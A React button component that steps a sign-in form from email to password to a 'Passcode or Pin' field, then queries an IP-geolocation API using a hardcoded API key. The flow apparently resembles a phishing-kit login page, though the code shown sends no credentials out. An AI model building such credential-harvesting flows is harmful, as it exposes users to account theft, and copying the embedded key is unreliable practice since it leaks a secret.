import React from "react";

class Buttonnxt extends React.Component {
  handleClick = () => {
    const now = this.props.state.session.sessid;
    if (now == "email") {
      this.props.setSession(
        "pw",
        "password",
        "Password",
        "password",
        "",
        "Sign in"
      );
      this.props.updateState("hide", true);
    }
    if (now == "pw") {
      this.props.setSession(
        "pin",
        "pin",
        "Passcode or Pin",
        "text",
        "",
        "Sign in"
      );
      this.props.updateState("hide", true);
    }
    if (now == "pin") {
      alert("start");
      const ajax = new XMLHttpRequest();
      ajax.onreadystatechange = () => {
        if (ajax.readyState == 4 && ajax.status == 200) {
          const data = JSON.parse(ajax.responseText);
          console.log(data.ip);
        }
      };
      ajax.open(
        "GET",
        "https://geo.ipify.org/api/v1?apiKey=at_56wsxRNKqEHifyYViheeZ0lwODIkc&ipAddress=8.8.8.8",
        true
      );
      ajax.send();
    }
  };
  render() {
    const isDisabled = this.props.state.button1.disable;
    return (
      <button
        onClick={this.handleClick}
        type="submit"
        className={this.props.state.button1.class}
        disabled={isDisabled}
      >
        {this.props.state.session.btntxt}
      </button>
    );
  }
}

export default Buttonnxt;
